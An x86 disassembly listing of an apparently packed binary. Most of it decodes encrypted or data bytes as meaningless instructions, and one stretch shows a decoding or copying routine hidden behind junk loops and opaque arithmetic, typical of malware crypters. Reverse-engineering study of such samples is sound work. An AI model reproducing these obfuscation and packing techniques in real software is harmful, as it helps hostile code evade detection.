  408016:	popf   
  408017:	fs fwait
  408019:	daa    
  40801a:	pop    ebx
  40801b:	js     0x407ff5
  40801d:	cmc    
  40801e:	imul   BYTE PTR [edx-0x81a327]
  408024:	xlat   BYTE PTR ds:[ebx]
  408025:	mov    ah,0x7b
  408027:	add    dh,al
  408029:	or     BYTE PTR [ebx],0x82
  40802c:	rcl    ebp,0x82
  40802f:	and    eax,ecx
  408031:	jecxz  0x407fca
  408033:	mov    bl,0x8f
  408035:	inc    edx
  408036:	(bad)  
  408037:	scas   eax,DWORD PTR es:[edi]
  408038:	lahf   
  408039:	mov    ebp,0x68aa6332
  40803e:	inc    eax
  40803f:	es adc al,dh
  408042:	mov    eax,0x31cb7e62
  408047:	xor    ebp,ebp
  408049:	cmp    BYTE PTR [edx],cl
  40804b:	ins    BYTE PTR es:[edi],dx
  40804c:	std    
  40804d:	jno    0x40809a
  40804f:	icebp  
  408050:	pop    ss
  408051:	jmp    0x84ea:0x8e2ac243
  408058:	pop    edi
  408059:	in     al,0x72
  40805b:	mov    ah,0x35
  40805d:	cs call 0xdcb15daf
  408063:	sub    BYTE PTR [eax+0x2d],ah
  408066:	pop    ebx
  408067:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408068:	adc    al,BYTE PTR [eiz*2+0x6b13adb1]
  40806f:	sbb    BYTE PTR [edi-0x72],bh
  408072:	mov    DWORD PTR [ebx],esp
  408074:	(bad)  [edx+0x3a]
  408077:	ret    
  408078:	and    BYTE PTR cs:[eax+ecx*4+0x4a],bh
  40807d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40807e:	sub    al,0x2d
  408080:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408081:	cmp    BYTE PTR [esi+0x6bca34e9],0x70
  408088:	out    dx,eax
  408089:	push   edi
  40808a:	cld    
  40808b:	ins    BYTE PTR es:[edi],dx
  40808c:	inc    edx
  40808d:	imul   ecx,DWORD PTR [ecx],0x4bf73871
  408093:	(bad)  
  408095:	dec    eax
  408096:	mov    ch,0x51
  408098:	pop    ebx
  408099:	shr    BYTE PTR [ebp-0x33],1
  40809c:	or     eax,0xe0dac657
  4080a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4080a2:	imul   edi,DWORD PTR [edx+0x77e432b8],0xffffff9b
  4080a9:	into   
  4080aa:	add    esp,0xebec4f07
  4080b0:	lods   eax,DWORD PTR ds:[esi]
  4080b1:	daa    
  4080b2:	adc    DWORD PTR [eax-0x1aefd628],eax
  4080b8:	call   0x7eb9728e
  4080bd:	popa   
  4080be:	sbb    dh,BYTE PTR [edi]
  4080c0:	arpl   dx,ax
  4080c2:	inc    edi
  4080c3:	dec    DWORD PTR [eax+0x4e9cf8b7]
  4080c9:	icebp  
  4080ca:	rol    edx,0x2e
  4080cd:	inc    esi
  4080ce:	out    dx,eax
  4080cf:	pop    ebx
  4080d0:	(bad)  
  4080d1:	add    BYTE PTR [ebp+0x73],bl
  4080d4:	push   ebx
  4080d5:	stos   DWORD PTR es:[edi],eax
  4080d6:	and    eax,0x426271a2
  4080db:	dec    ebp
  4080dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4080dd:	rol    BYTE PTR [esi],cl
  4080df:	and    eax,0xeb48bcc1
  4080e4:	loop   0x408130
  4080e6:	pop    ebp
  4080e7:	jnp    0x4080c1
  4080e9:	cld    
  4080ea:	and    BYTE PTR [esi-0x60],0x49
  4080ee:	mov    WORD PTR [eax-0x28],ss
  4080f1:	add    edi,DWORD PTR ds:0x9f8f7fdc
  4080f7:	or     al,0x5f
  4080f9:	cmp    dh,BYTE PTR [eax]
  4080fb:	in     al,0x30
  4080fd:	sub    DWORD PTR [ebp+0x7c],ebp
  408100:	and    dh,BYTE PTR [eax]
  408102:	adc    DWORD PTR [edi+0x5236ec44],eax
  408108:	aad    0xf8
  40810a:	adc    DWORD PTR [ecx+0x25c37451],ebx
  408110:	xchg   edx,eax
  408111:	pop    ds
  408112:	clc    
  408113:	sysexit 
  408115:	leave  
  408116:	adc    al,0x2c
  408118:	jg     0x408145
  40811a:	jmp    0x60c68ce1
  40811f:	lahf   
  408120:	(bad)  
  408121:	fnstenv [edx]
  408123:	and    al,0x7b
  408125:	(bad)  
  408126:	or     eax,0x73d2a4d6
  40812b:	xchg   edi,eax
  40812c:	int3   
  40812d:	(bad)  
  40812e:	inc    edx
  40812f:	xor    BYTE PTR [esi+0x405d51ec],ch
  408135:	imul   edi,edx,0x11df45de
  40813b:	pop    ss
  40813c:	adc    al,0x14
  40813e:	adc    ebx,edx
  408140:	loope  0x4081a8
  408142:	sti    
  408143:	pusha  
  408144:	dec    ecx
  408145:	and    al,0xfe
  408147:	lds    edi,FWORD PTR [esi+eax*8+0x75]
  40814b:	test   BYTE PTR [edx],bl
  40814d:	push   edx
  40814e:	or     ch,BYTE PTR [ecx-0x49a77652]
  408154:	mov    al,ds:0xe2071cbd
  408159:	test   DWORD PTR [ebp-0x33],esi
  40815c:	mov    eax,ds:0x4db83f2d
  408161:	repz mov ebp,0xc4112549
  408167:	(bad)  
  408168:	mov    DWORD PTR [ebp-0x44],ebx
  40816b:	mov    bl,0x2c
  40816d:	fiadd  DWORD PTR [eax-0x4f9a4dab]
  408173:	ja     0x4081f3
  408175:	push   0xc1554d5e
  40817a:	mov    ?,WORD PTR [edi]
  40817c:	mov    BYTE PTR [edx],ah
  40817e:	cmp    esp,0x6a563de
  408184:	je     0x4081c1
  408186:	mov    DWORD PTR [eax+edi*2-0x7ec5dfb9],eax
  40818d:	xchg   bh,dl
  40818f:	ins    DWORD PTR es:[edi],dx
  408190:	ins    BYTE PTR es:[edi],dx
  408191:	sbb    dl,dl
  408193:	or     dl,ch
  408195:	add    cl,dh
  408197:	popa   
  408198:	xor    esi,DWORD PTR [esi]
  40819a:	fucomi st,st(1)
  40819c:	leave  
  40819d:	cmp    eax,0x8a40c27c
  4081a2:	inc    edi
  4081a3:	dec    eax
  4081a4:	and    BYTE PTR [edi-0x4],ch
  4081a7:	dec    edi
  4081a8:	and    al,0x3
  4081aa:	add    DWORD PTR [ebx+0x168ebb30],eax
  4081b0:	xlat   BYTE PTR ds:[ebx]
  4081b1:	fbstp  TBYTE PTR [ecx+0x405c88ab]
  4081b7:	push   eax
  4081b8:	int3   
  4081b9:	shl    eax,1
  4081bb:	xchg   BYTE PTR [ebx-0x1605c809],al
  4081c1:	rcr    DWORD PTR [esi-0x57340846],cl
  4081c7:	sbb    ebp,DWORD PTR [ecx+0x3a17b098]
  4081cd:	mov    ch,0x95
  4081cf:	push   edi
  4081d0:	sbb    DWORD PTR [esi],edx
  4081d2:	or     BYTE PTR [esp+esi*2-0x56],dl
  4081d6:	into   
  4081d7:	pusha  
  4081d8:	(bad)  
  4081d9:	int3   
  4081da:	(bad)  
  4081db:	sbb    ecx,esi
  4081dd:	push   es
  4081de:	dec    edi
  4081df:	jae    0x4081cb
  4081e1:	mov    ch,0x72
  4081e3:	pop    ds
  4081e4:	mov    cl,0xa1
  4081e6:	mov    ebp,fs
  4081e8:	pop    edi
  4081e9:	sub    BYTE PTR [esp+edx*8],0x4a
  4081ed:	cs jg  0x4081d8
  4081f0:	pop    edi
  4081f1:	or     eax,0x9fbbb590
  4081f6:	fstp   QWORD PTR [ebp+eiz*4-0x42]
  4081fa:	(bad)  
  4081fb:	dec    ebx
  4081fc:	sub    esp,DWORD PTR [ebx+0x19]
  4081ff:	jl     0x4081f3
  408201:	mov    edx,0x5fcfc18e
  408206:	cli    
  408207:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408208:	sbb    eax,0xc03b37c1
  40820d:	jl     0x4081b8
  40820f:	mov    ah,0x4
  408211:	arpl   WORD PTR [esi-0x3ff469a1],bx
  408217:	in     al,dx
  408218:	sub    dl,BYTE PTR fs:[edi-0x41b71243]
  40821f:	cmp    ah,cl
  408221:	push   ebx
  408222:	pop    ebx
  408223:	not    esp
  408225:	or     edi,DWORD PTR ds:0x15c110ce
  40822b:	in     eax,0x0
  40822d:	iret   
  40822e:	pop    ebp
  40822f:	sahf   
  408230:	call   0x38a9:0x159be26e
  408237:	cld    
  408238:	(bad)  
  408239:	out    0xd1,al
  40823b:	outs   dx,BYTE PTR ds:[esi]
  40823c:	mov    eax,ds:0x8ec9a7b3
  408241:	cmp    DWORD PTR [eax],eax
  408243:	jbe    0x4081c6
  408245:	or     BYTE PTR [ecx+ebx*1-0x3580c1b6],dl
  40824c:	xchg   edi,eax
  40824d:	cmp    edx,DWORD PTR [ebx-0x60]
  408250:	popa   
  408251:	add    DWORD PTR [ebp*8-0x1f878362],edx
  408258:	jl     0x408277
  40825a:	jl     0x4081f8
  40825c:	push   ss
  40825d:	sbb    DWORD PTR [edi+0x28900a93],ebp
  408263:	mov    edx,0xea9e8392
  408268:	dec    edx
  408269:	int    0xff
  40826b:	sahf   
  40826c:	imul   ebp,DWORD PTR [esi],0xffffffb1
  40826f:	cmp    BYTE PTR ds:0x9b7ef817,ch
  408275:	cmp    eax,0x49d2c09f
  40827a:	pop    ebp
  40827b:	test   BYTE PTR [ecx],ah
  40827d:	mov    esi,0xb22b95d9
  408282:	and    BYTE PTR [esi-0x43a234e8],bl
  408288:	ins    BYTE PTR es:[edi],dx
  408289:	arpl   WORD PTR [ebp-0x20bd0edf],bp
  40828f:	lods   al,BYTE PTR ds:[esi]
  408290:	ins    DWORD PTR es:[edi],dx
  408291:	xchg   ebp,eax
  408292:	icebp  
  408293:	out    0xd2,eax
  408295:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408296:	out    0x7e,al
  408298:	test   eax,0x8c67eb1f
  40829d:	outs   dx,DWORD PTR ds:[esi]
  40829e:	mov    al,ds:0x286d2892
  4082a3:	sbb    edi,edx
  4082a5:	outs   dx,DWORD PTR ds:[esi]
  4082a6:	inc    edx
  4082a7:	inc    edi
  4082a8:	adc    BYTE PTR [esi+esi*4],dl
  4082ab:	dec    ebp
  4082ac:	data16 data16 ds into 
  4082b0:	mov    edi,0x2340ab57
  4082b5:	pop    ds
  4082b6:	cmp    bh,BYTE PTR ds:0x44b1591f
  4082bc:	push   ecx
  4082bd:	outs   dx,DWORD PTR ds:[esi]
  4082be:	inc    edi
  4082bf:	push   ss
  4082c0:	aam    0x32
  4082c2:	xchg   bh,dl
  4082c4:	adc    eax,0x1059159b
  4082c9:	mov    dh,0x4b
  4082cb:	cli    
  4082cc:	loop   0x4082f2
  4082ce:	inc    edx
  4082cf:	fisub  WORD PTR [ebp+edx*2-0x73c750ee]
  4082d6:	imul   ebx,DWORD PTR [edi+0x2b06bda7],0xffffffb7
  4082dd:	inc    ebp
  4082de:	loopne 0x4082c6
  4082e0:	push   0x23
  4082e2:	fisub  WORD PTR [ecx]
  4082e4:	pop    esi
  4082e5:	push   ebx
  4082e6:	(bad)
  4082e9:	pushf  
  4082ea:	mov    edi,0x85c2ed4f
  4082ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4082f0:	or     eax,0xa5d99ae7
  4082f5:	xchg   edx,eax
  4082f6:	in     eax,dx
  4082f7:	push   cs
  4082f8:	or     ch,0x65
  4082fb:	in     eax,0x52
  4082fd:	ror    BYTE PTR [esi+0x5a],0x4c
  408301:	and    eax,0xcf9cc240
  408306:	in     al,dx
  408307:	out    0x63,eax
  408309:	pop    edi
  40830a:	mov    bh,0x6f
  40830c:	cmp    eax,DWORD PTR [edi-0x601e25b9]
  408312:	xor    DWORD PTR [edx+0x5a80eea2],esi
  408318:	sub    DWORD PTR [ebx],esi
  40831a:	add    DWORD PTR [ebx-0x36b91875],edx
  408320:	repz ja 0x408316
  408323:	xor    dh,bh
  408325:	xor    eax,0xf3e21b1a
  40832a:	(bad)  
  40832b:	adc    DWORD PTR ds:0xb888fb23,esp
  408331:	pop    ebx
  408332:	out    dx,eax
  408333:	xchg   edi,eax
  408334:	inc    DWORD PTR [esi+0x5d14e5e8]
  40833a:	dec    edi
  40833b:	mov    eax,ds:0x1634e1b7
  408340:	in     eax,dx
  408341:	int    0x83
  408343:	int3   
  408344:	adc    eax,0x9b984b6e
  408349:	int3   
  40834a:	ins    DWORD PTR es:[edi],dx
  40834b:	sar    DWORD PTR [esi+ecx*2+0x4855318a],cl
  408352:	pop    eax
  408353:	jne    0x408392
  408355:	xor    BYTE PTR [eax+0x2660e74f],0xb
  40835c:	dec    ebp
  40835d:	mov    dl,0xad
  40835f:	dec    eax
  408360:	jo     0x4082e3
  408362:	sub    eax,0xbbcb699d
  408367:	sti    
  408368:	jnp    0x4083a6
  40836a:	call   0x8a61e2ee
  40836f:	inc    edx
  408370:	mov    ch,0x7c
  408372:	inc    eax
  408373:	or     al,0x3d
  408375:	mov    ah,0xd5
  408377:	xor    BYTE PTR [ebx],dl
  408379:	push   cs
  40837a:	pop    ebp
  40837b:	mov    esp,0x3dbda145
  408380:	mov    ch,BYTE PTR ds:0x55bb6aea
  408386:	mov    ch,0xea
  408388:	xor    bh,BYTE PTR [edx+0x5f9c3786]
  40838e:	inc    esp
  40838f:	sahf   
  408390:	inc    ebx
  408391:	lods   eax,DWORD PTR ds:[esi]
  408392:	mov    eax,ds:0xe0b7f215
  408397:	mov    bl,0xe2
  408399:	aas    
  40839a:	shl    ebx,cl
  40839c:	mov    edi,0x2d82f2a7
  4083a1:	push   ebx
  4083a2:	jo     0x40832a
  4083a4:	rol    DWORD PTR [esi],cl
  4083a6:	sub    DWORD PTR [edi-0x1f],edi
  4083a9:	xchg   esp,eax
  4083aa:	lock loopne 0x4083ce
  4083ad:	inc    edi
  4083ae:	push   edx
  4083af:	or     esi,DWORD PTR [ebx-0x5a636bd9]
  4083b5:	mov    eax,0x18af9678
  4083ba:	mov    eax,0x1372e02c
  4083bf:	adc    eax,0x1220adf5
  4083c4:	scas   eax,DWORD PTR es:[edi]
  4083c5:	call   0x1a95:0xc73c43b7
  4083cc:	imul   esp,DWORD PTR [edx],0xffffff8e
  4083cf:	mov    esi,0xadc02650
  4083d4:	add    eax,0x64ebe976
  4083d9:	das    
  4083da:	stos   DWORD PTR es:[edi],eax
  4083db:	mov    esi,esi
  4083dd:	stos   DWORD PTR es:[edi],eax
  4083de:	aas    
  4083df:	rcl    DWORD PTR [esi],0x3c
  4083e2:	mov    al,0xdb
  4083e4:	mov    bl,0xfe
  4083e6:	(bad)  
  4083e7:	xor    ch,BYTE PTR [ecx-0x5c]
  4083ea:	adc    eax,DWORD PTR gs:[eax+0x226574ab]
  4083f1:	or     BYTE PTR [edx-0x6ec4ea82],0x8f
  4083f8:	in     eax,dx
  4083f9:	mov    edi,0xf6039cdb
  4083fe:	xchg   ebx,eax
  4083ff:	sbb    DWORD PTR [edi],esp
  408401:	jne    0x4083e1
  408403:	sbb    edx,DWORD PTR [esi-0x1d0abc7d]
  408409:	pushf  
  40840a:	sub    eax,0x5b5e7837
  40840f:	leave  
  408410:	ret    0xc
  408413:	push   ebp
  408414:	mov    ebp,esp
  408416:	mov    DWORD PTR ds:0x424102,0xf89c85b5
  408420:	mov    DWORD PTR ds:0x42a00c,0x7dd6
  40842a:	pop    ebp
  40842b:	jmp    0x41b7a1
  408430:	xor    eax,eax
  408432:	or     DWORD PTR ds:0x42b010,0x429008
  40843c:	inc    eax
  40843d:	ret    
  40843e:	push   ebp
  40843f:	mov    ebp,esp
  408441:	sub    esp,0x10
  408444:	sbb    ecx,DWORD PTR ds:0x42d008
  40844a:	mov    eax,0xf89c85b6
  40844f:	mov    edx,DWORD PTR ds:0x42b000
  408455:	add    DWORD PTR ds:0x42c018,edx
  40845b:	mov    DWORD PTR [ebp-0x4],eax
  40845e:	dec    edx
  40845f:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  408466:	mov    DWORD PTR ds:0x42b01c,0x18
  408470:	cmp    DWORD PTR ds:0x42b01c,0x0
  408477:	je     0x4084ad
  40847d:	cmp    DWORD PTR ds:0x42b01c,0x1b
  408484:	jne    0x40849b
  40848a:	push   DWORD PTR [ebp-0x28]
  40848d:	push   0x7565
  408492:	push   DWORD PTR [ebp-0x18]
  408495:	call   DWORD PTR ds:0x425040
  40849b:	mov    edx,DWORD PTR ds:0x42b01c
  4084a1:	dec    edx
  4084a2:	mov    DWORD PTR ds:0x42b01c,edx
  4084a8:	jmp    0x408470
  4084ad:	mov    ecx,DWORD PTR [ebp-0x4]
  4084b0:	xor    edx,DWORD PTR ds:0x42b008
  4084b6:	push   esi
  4084b7:	mov    DWORD PTR ds:0x42c000,0x17
  4084c1:	cmp    DWORD PTR ds:0x42c000,0x0
  4084c8:	je     0x408518
  4084ce:	cmp    DWORD PTR ds:0x42c000,0xa
  4084d5:	jne    0x4084ec
  4084db:	push   0x8fa2
  4084e0:	push   DWORD PTR [ebp-0x24]
  4084e3:	push   DWORD PTR [ebp-0xc]
  4084e6:	call   DWORD PTR ds:0x425044
  4084ec:	cmp    DWORD PTR ds:0x42c000,0xb
  4084f3:	jne    0x408506
  4084f9:	mov    edx,DWORD PTR ds:0x42c000
  4084ff:	dec    edx
  408500:	mov    DWORD PTR ds:0x42c000,edx
  408506:	mov    edx,DWORD PTR ds:0x42c000
  40850c:	dec    edx
  40850d:	mov    DWORD PTR ds:0x42c000,edx
  408513:	jmp    0x4084c1
  408518:	mov    edx,0x7510893
  40851d:	xor    ecx,edx
  40851f:	and    DWORD PTR ds:0x429018,0x2759
  408529:	mov    esi,0x3272db
  40852e:	mov    DWORD PTR ds:0x42b01c,0x64d9
  408538:	push   edi
  408539:	mov    DWORD PTR ds:0x42c000,0x1c
  408543:	cmp    DWORD PTR ds:0x42c000,0x0
  40854a:	je     0x4085a2
  408550:	cmp    DWORD PTR ds:0x42c000,0xb
  408557:	jne    0x408573
  40855d:	push   DWORD PTR [ebp-0xc]
  408560:	push   DWORD PTR [ebp-0x10]
  408563:	push   0x6908
  408568:	push   0x2a1a
  40856d:	call   DWORD PTR ds:0x425048
  408573:	cmp    DWORD PTR ds:0x42c000,0xc
  40857a:	jne    0x40858f
  408580:	xor    edi,edi
  408582:	xor    edi,DWORD PTR ds:0x42c000
  408588:	dec    edi
  408589:	mov    DWORD PTR ds:0x42c000,edi
  40858f:	mov    edi,DWORD PTR ds:0x42c000
  408595:	dec    edi
  408596:	mov    DWORD PTR ds:0x42c000,edi
  40859c:	jmp    0x408543
  4085a1:	dec    edi
  4085a2:	mov    edi,DWORD PTR [ebp+0x10]
  4085a5:	xor    DWORD PTR ds:0x429004,0x6210
  4085af:	add    ecx,esi
  4085b1:	cmp    ecx,edi
  4085b3:	je     0x408678
  4085b9:	mov    ecx,DWORD PTR [ebp-0x4]
  4085bc:	mov    edi,DWORD PTR [ebp+0x10]
  4085bf:	xor    eax,eax
  4085c1:	xor    ecx,edx
  4085c3:	add    ecx,esi
  4085c5:	add    edi,0xfabdbef1
  4085cb:	adc    eax,0xffffffff
  4085ce:	xor    eax,0x0
  4085d1:	mov    DWORD PTR [ebp-0xc],eax
  4085d4:	push   ebx
  4085d5:	xor    ebx,ebx
  4085d7:	xor    edi,0x8a29a123
  4085dd:	mov    eax,ecx
  4085df:	add    eax,0xfabdbef1
  4085e4:	adc    ebx,0xffffffff
  4085e7:	xor    eax,0x8a29a123
  4085ec:	xor    ebx,0x0
  4085ef:	cmp    eax,edi
  4085f1:	jne    0x40860a
  4085f7:	cmp    ebx,DWORD PTR [ebp-0xc]
  4085fa:	je     0x408672
  408600:	jmp    0x40860a
  408605:	mov    esi,0x3272db
  40860a:	mov    eax,DWORD PTR [ebp-0x4]
  40860d:	mov    edi,DWORD PTR [ebp-0x8]
  408610:	xor    edi,edx
  408612:	add    edi,esi
  408614:	mov    esi,DWORD PTR [ebp+0x8]
  408617:	imul   edi,ecx
  40861a:	mov    ebx,DWORD PTR [ebp+0xc]
  40861d:	xor    eax,edx
  40861f:	add    eax,ecx
  408621:	mov    al,BYTE PTR [ebx+eax*1+0x3272db]
  408628:	mov    BYTE PTR [edi+esi*1],al
  40862b:	mov    eax,DWORD PTR [ebp-0x8]
  40862e:	mov    esi,DWORD PTR [ebp+0x10]
  408631:	xor    eax,edx
  408633:	xor    ebx,ebx
  408635:	add    esi,0xfabdbef1
  40863b:	adc    ebx,0xffffffff
  40863e:	lea    ecx,[ecx+eax*1+0x3272db]
  408645:	xor    edi,edi
  408647:	xor    esi,0x8a29a123
  40864d:	xor    ebx,0x0
  408650:	mov    eax,ecx
  408652:	add    eax,0xfabdbef1
  408657:	adc    edi,0xffffffff
  40865a:	xor    eax,0x8a29a123
  40865f:	xor    edi,0x0
  408662:	cmp    eax,esi
  408664:	jne    0x408605
  40866a:	cmp    edi,ebx
  40866c:	jne    0x408605
  408672:	mov    eax,0xf89c85b5
  408677:	pop    ebx
  408678:	pop    edi
  408679:	pop    esi
  40867a:	leave  
  40867b:	ret    0xc
  40867e:	push   ebp
  40867f:	mov    ebp,esp
  408681:	sub    esp,0x78
  408684:	adc    DWORD PTR ds:0x429000,0x42d00c
  40868e:	push   ebx
  40868f:	or     DWORD PTR ds:0x42d000,0x5016
  408699:	push   esi
  40869a:	sbb    DWORD PTR ds:0x42d008,0x6d64
  4086a4:	push   edi
  4086a5:	push   0x1f
  4086a7:	and    DWORD PTR ds:0x42d018,0x1f4a
  4086b1:	lea    eax,[ebp-0x78]
  4086b4:	push   eax
  4086b5:	not    DWORD PTR ds:0x42c008
  4086bb:	push   0x0
  4086bd:	xor    DWORD PTR ds:0x429008,0x2961
  4086c7:	jmp    0x40aa2c
  4086cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4086cd:	xchg   esi,eax
  4086ce:	sub    edx,ebp
  4086d0:	out    0x65,eax
  4086d2:	arpl   WORD PTR [ebx+eiz*8+0x5b1a558d],dx
  4086d9:	pop    ebp
  4086da:	lds    ecx,FWORD PTR [esi+0x50]
  4086dd:	sbb    BYTE PTR [edx+0x62],ah
  4086e0:	cmp    bl,BYTE PTR [edi+0x62]
  4086e3:	bound  ebp,QWORD PTR [ecx]
  4086e5:	sar    DWORD PTR [esi-0x1918202b],cl
  4086eb:	mov    ebp,0xc41f0b1b
  4086f0:	pop    ebp
  4086f1:	cmc    
  4086f2:	mov    edx,0x85bec4d4
  4086f7:	sub    dl,bh
  4086f9:	inc    esp
  4086fa:	push   0x4f
  4086fc:	or     ebx,DWORD PTR [ecx-0x15]
  4086ff:	or     BYTE PTR [edx+0x6a],0xfd
  408703:	test   esi,0x290ed4f5
  408709:	adc    al,0xf7
  40870b:	clc    
  40870c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40870d:	fucomip st,st(0)
  40870f:	out    dx,eax
  408710:	enter  0x550a,0x9f
  408714:	jecxz  0x408735
  408716:	mov    eax,DWORD PTR [edi]
  408718:	popa   
  408719:	xchg   edx,eax
  40871a:	mov    dl,0x89
  40871c:	repnz scas al,BYTE PTR es:[edi]
  40871e:	int    0x29
  408720:	pusha  
  408721:	adc    DWORD PTR [esi],ecx
  408723:	lea    ebx,[eax]
  408725:	in     eax,dx
  408726:	call   0xf718:0xffc3d130
  40872d:	sbb    cl,BYTE PTR [esi+0x41]
  408730:	sub    eax,0x1c1673eb
  408735:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408736:	dec    eax
  408737:	xor    DWORD PTR [edi+0x7fac170b],ecx
  40873d:	sub    dh,BYTE PTR [eax+0x2f232152]
  408743:	cmp    eax,0x3a0b4393
  408748:	fst    DWORD PTR [ebp+0x3b9f4930]
  40874e:	xor    al,0x3a
  408750:	cld    
  408751:	mul    BYTE PTR fs:[ebp+0x7f176bce]
  408758:	jno    0x40873a
  40875a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40875b:	push   ebx
  40875c:	cmp    al,0x30
  40875e:	addr16 jns 0x408721
  408761:	(bad)  
  408762:	enter  0x87cb,0x64
  408766:	and    DWORD PTR [ebp+0x28],eax
  408769:	dec    ecx
  40876a:	in     eax,dx
  40876b:	jl     0x40870c
  40876d:	push   esp
  40876e:	pop    ds
  40876f:	rcr    DWORD PTR [edi+0x78],cl
  408772:	jnp    0x4087bf
  408774:	call   0x617e:0x3fd17d76
  40877b:	fstp   QWORD PTR [ecx]
  40877d:	mov    cl,0x8d
  40877f:	dec    eax
  408780:	in     eax,0xbe
  408782:	dec    ecx
  408783:	inc    edx
  408784:	or     eax,0x2f20efd8
  408789:	dec    edx
  40878a:	jns    0x408733
  40878c:	jecxz  0x408795
  40878e:	outs   dx,BYTE PTR ds:[esi]
  40878f:	mov    esp,0x3c33438e
  408794:	call   0x5f194b64
  408799:	fnstsw WORD PTR [ebp+0x8]
  40879c:	ja     0x408759
  40879e:	xor    BYTE PTR ds:0xf9f62ce3,dh
  4087a4:	mov    eax,0x3623812d
  4087a9:	imul   eax
  4087ab:	loop   0x408750
  4087ad:	or     BYTE PTR [edi+0x31],bh
  4087b0:	mov    esp,0x7c6f8aad
  4087b5:	push   ebp
  4087b6:	mov    ch,0xde
  4087b8:	inc    edx
  4087b9:	mov    cs,WORD PTR [edx+ebp*2-0x53]
  4087bd:	push   DWORD PTR [esi]
  4087bf:	xor    al,0xe7
  4087c1:	adc    DWORD PTR [esi+0xb],eax
  4087c4:	inc    esp
  4087c5:	fbld   TBYTE PTR [ecx]
  4087c7:	mov    esp,0xfdf5c85a
  4087cc:	pusha  
  4087cd:	mov    WORD PTR [edi-0x4c5a3d2a],?
  4087d3:	xchg   edx,eax
  4087d4:	mov    bh,BYTE PTR [eax+0x503217be]
  4087da:	cdq    
  4087db:	sub    BYTE PTR [edx-0xa85f004],ah
  4087e1:	xlat   BYTE PTR gs:[ebx]
  4087e3:	xchg   edi,eax
  4087e4:	stos   DWORD PTR es:[edi],eax
  4087e5:	and    eax,DWORD PTR [edx+ebp*8-0x30eb9a9]
  4087ec:	xchg   esp,eax
  4087ed:	scas   al,BYTE PTR es:[edi]
  4087ee:	and    cl,bh
  4087f0:	push   edi
  4087f1:	xchg   edi,eax
  4087f2:	dec    ebp
  4087f3:	je     0x40882c
  4087f5:	sahf   
  4087f6:	push   cs
  4087f7:	shl    DWORD PTR [ebp+0x2],cl
  4087fa:	dec    eax
  4087fb:	mov    ch,cl
  4087fd:	mov    eax,ds:0x9f39f8e2
  408802:	sbb    BYTE PTR [eax-0x2ca1bb50],bl
  408808:	rol    BYTE PTR [edi+0x32],cl
  40880b:	cmp    ah,cl
  40880d:	or     BYTE PTR [edx-0x59],ah
  408810:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408811:	das    
  408812:	add    BYTE PTR [edx],0x30
  408815:	sbb    al,0xab
  408817:	ds cdq 
  408819:	and    eax,0xc5acd9a4
  40881e:	sbb    BYTE PTR [esi],0x96
  408821:	add    BYTE PTR [edi-0x77],al
  408824:	xor    eax,0x474d09dc
  408829:	retw   
  40882b:	and    eax,0x239d25da
  408830:	scas   al,BYTE PTR es:[edi]
  408831:	daa    
  408832:	adc    ebx,DWORD PTR [ecx]
  408834:	xor    eax,0x6492f9c
  408839:	mov    edx,0xe05bddb9
  40883e:	add    ecx,ebx
  408840:	and    eax,0xfb798b2d
  408845:	rol    BYTE PTR [edi+0x76],1
  408848:	jo     0x408830
  40884a:	(bad)  
  40884b:	jns    0x4088cc
  40884d:	add    eax,0x57898304
  408852:	inc    edx
  408853:	int    0xfb
  408855:	hlt    
  408856:	mov    ebp,DWORD PTR [edi]
  408858:	hlt    
  408859:	pushf  
  40885a:	xchg   edx,eax
  40885b:	fdiv   st(3),st
  40885d:	es mov ah,0xae
  408860:	inc    eax
  408861:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408862:	mov    cs,WORD PTR [ecx-0x6d10e220]
  408868:	fist   DWORD PTR [eax+ecx*2]
  40886b:	jle    0x4088e4
  40886d:	add    DWORD PTR [eax-0x6b09e483],0xec421ae4
  408877:	aas    
  408878:	add    al,0x63
  40887a:	or     al,0xbc
  40887c:	cmp    al,0xb6
  40887e:	mov    eax,DWORD PTR [ebx+0x2fe5091a]
  408884:	cmp    BYTE PTR [edx],cl
  408886:	cmp    BYTE PTR [eax+0x60],0xdd
  40888a:	dec    eax
  40888b:	arpl   WORD PTR [ecx-0xe],ax
  40888e:	and    DWORD PTR [ebx],ebx
  408890:	lods   al,BYTE PTR ds:[esi]
  408891:	push   0x1d8ed41e
  408896:	inc    esi
  408897:	gs or  esi,0x95a050bf
  40889e:	in     eax,dx
  40889f:	in     eax,dx
  4088a0:	inc    esp
  4088a1:	or     dh,bl
  4088a3:	ins    BYTE PTR es:[edi],dx
  4088a4:	out    dx,al
  4088a5:	fs push edi
  4088a7:	arpl   WORD PTR [ecx+0x2b],sp
  4088aa:	out    0x74,al
  4088ac:	jne    0x4088f1
  4088ae:	sub    DWORD PTR [ebp+0x651d122e],edx
  4088b4:	adc    BYTE PTR [eax-0x33],ch
  4088b7:	mov    dh,0xab
  4088b9:	sbb    al,0x53
  4088bb:	mov    edx,0x894fd763
  4088c0:	jne    0x4088e5
  4088c2:	out    dx,al
  4088c3:	outs   dx,DWORD PTR ds:[esi]
  4088c4:	mov    dl,0x8f
  4088c6:	pusha  
  4088c7:	or     eax,DWORD PTR [ebp+0x69]
  4088ca:	push   edi
  4088cb:	push   esp
  4088cc:	add    al,0xf6
  4088ce:	sbb    eax,0x8ef217c1
  4088d3:	mov    al,ds:0x162b0c35
  4088d8:	popa   
  4088d9:	xchg   edx,esi
  4088db:	pusha  
  4088dc:	aas    
  4088dd:	jb     0x408898
  4088df:	or     DWORD PTR [edx+0x7b10453d],ebp
  4088e5:	push   eax
  4088e6:	mov    ds:0xf456844b,eax
  4088eb:	pop    eax
  4088ec:	mov    DWORD PTR [esi+ebx*8],ebp
